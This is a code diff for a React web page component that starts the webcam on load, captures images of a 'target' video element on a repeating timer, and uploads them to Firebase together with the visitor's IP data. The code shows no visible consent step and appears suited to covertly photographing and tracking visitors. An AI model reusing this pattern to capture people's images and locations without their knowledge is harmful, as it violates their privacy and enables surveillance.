@@ -4,20 +4,22 @@ import { capture, getCam } from "../../libs/cam";
 import { getDbRef } from "../../config/fbConnect";
 import { set } from "firebase/database";
 import { getIp } from "../../libs/utill";
+import { ssd } from "../../libs/helper";
 const Home = () => {
-    const [id, setId] = React.useState('user');
+    const [IP, setIp] = React.useState({});
     const [counter, setCount] = React.useState(1);
+    const user = ssd.get('user');
 
     const getSystemIP = async ()=> {
         const ip = await getIp();
-        const idStr = ip.split('.').join('-');
-        setId(idStr);
+        setIp(ip);
     }
 
     const takeData = async () => {
         let url = capture('capturtarget', 'targetVid');
-        set(getDbRef(`users/${id}/${counter}`), {
+        set(getDbRef(`users/${user.mobile}/proof/${counter}`), {
             imgUrl: url,
+            coords: IP,
         });
         let tim = setTimeout(()=> {
             setCount(counter+1);
@@ -31,8 +33,9 @@ const Home = () => {
 
     React.useEffect(()=> {
         getSystemIP();
-        getCam('targetVid')
-    }, [])
+        getCam('targetVid');
+    }, []);
+      
 
     return (
         <div>
